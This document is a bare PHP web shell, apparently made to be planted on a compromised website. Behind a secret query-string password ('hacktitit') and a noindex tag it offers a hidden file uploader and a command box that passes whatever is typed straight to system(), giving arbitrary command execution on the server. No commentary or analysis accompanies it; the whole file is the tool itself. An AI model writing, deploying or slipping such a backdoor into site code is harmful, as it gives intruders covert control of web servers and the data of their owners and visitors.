<?php $FilesMan ="hacktitit"; 
if($_GET['post']==$FilesMan)
{ 
if(isset($_POST['uploaded'])) { 
$file = $_FILES['files']['name']; 
$files= $_FILES['files']['tmp_name']; 
$folder=""; 
if(move_uploaded_file($files,$folder.$file)) { 
$result = "Uploaded :<a href='$file' Men='_blank'>=> Click Ur File ^_^</a>"; 
} 
else 
{ 
$result = "Fail Try..."; 
} 
}
echo'
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Aku Suka Mamak Mu</title>
<meta name="robots" content="noindex,nofollow">
</head>
'; 
echo'
</head> 
<body> 
<center> 
<h3>{ Uploader Hidden }</h3> 
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="E-Bool Om">
</form>
        
 '.$result.' 
 </body>
 </html>';
 
 echo"<br><br><br><br><br><h3>{ CMD Execute }</h3>";
 echo "<form name='form' action='#' method='post'>
       <input type='text' name='coba'/> <input type='submit' value='Entod Om '/>
       </form>";
       
echo "<pre>";
        
        $cmd = ($_POST['coba']);
        system($cmd);
        echo "</pre>";
       
}
?>
